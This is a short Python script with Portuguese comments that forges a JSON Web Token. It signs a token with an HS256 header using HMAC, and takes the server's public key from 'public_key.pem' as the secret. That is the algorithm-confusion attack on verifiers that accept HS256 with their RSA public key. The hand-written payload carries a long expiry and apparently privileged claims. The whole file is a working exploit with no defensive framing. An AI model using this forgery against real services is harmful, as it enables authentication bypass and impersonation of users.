import hmac, hashlib, base64

file=open('public_key.pem')

key = file.read()

header = '{"alg":"HS256"}'
payload = '{"c": "10704889765","h": "true","i": "51425","exp": 1723689731,"iat": 1623687931}'

#Encodando header
encodedHeaderBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHeaderBytes, "utf-8").rstrip("=")

#Criando payload encodado
encodedPayloadBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPayloadBytes, "utf-8").rstrip("=")

#Concatenando header e payload
token = (encodedHeader + "." + encodedPayload)

#Creating Signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(token + '.' + sig)